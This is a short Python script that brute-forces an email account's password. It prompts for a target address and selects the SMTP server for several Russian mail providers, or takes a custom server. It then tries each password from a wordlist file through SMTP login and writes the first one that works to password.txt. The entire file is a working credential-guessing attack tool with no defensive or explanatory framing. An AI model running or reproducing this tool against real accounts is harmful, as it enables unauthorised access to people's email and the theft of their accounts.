import smtplib
import socket
from time import sleep as close
def cut(string):
	resstring = ''
	for i in string:
		if i == '\n':
			break
		else:
			resstring += i
	return resstring
try:
	login = input('Type mail: ')
	if login.endswith('@mail.ru') == True:
		url = 'smtp.mail.ru'
	elif login.endswith('@yandex.ru') == True:
		url = 'smtp.yandex.ru'
	elif login.endswith('@inbox.ru') == True:
		url = 'smtp.inbox.ru'
	elif login.endswith('@list.ru') == True:
		url = 'smtp.list.ru'
	elif login.endswith('@bk.ru') == True:
		url = 'smtp.bk.ru'
	else:
		url = input('Type URL: ')
	try:
		server = smtplib.SMTP_SSL(url, 465)
	except socket.gaierror:
		print('Failed to find [' + url + ']')
	else:
		path = input('Type path of list: ')
		try:
			file = open(path, 'r')
		except FileNotFoundError:
			print('Failed to find [' + path + ']')
		else:
			for i in file:
				server = smtplib.SMTP_SSL(url, 465)

				if i.endswith('\n') == True:
					password = cut(i)
				else:
					password = i
				try:
					server.login(login, password)
				except smtplib.SMTPAuthenticationError:
					print('Failed to log in [' + login + '] with [' + password + ']')
				else:
					print('Successfully logged in [' + login + '] with [' + password + ']')
					with open('password.txt', 'w') as result:
						result.write(password)
					print('Password of [' + login + '] was saved in [password.txt]')
					break
				file.close
	print('The program will be closed in 30 seconds')
	close(30)
except KeyboardInterrupt:
	print('\nAborted')
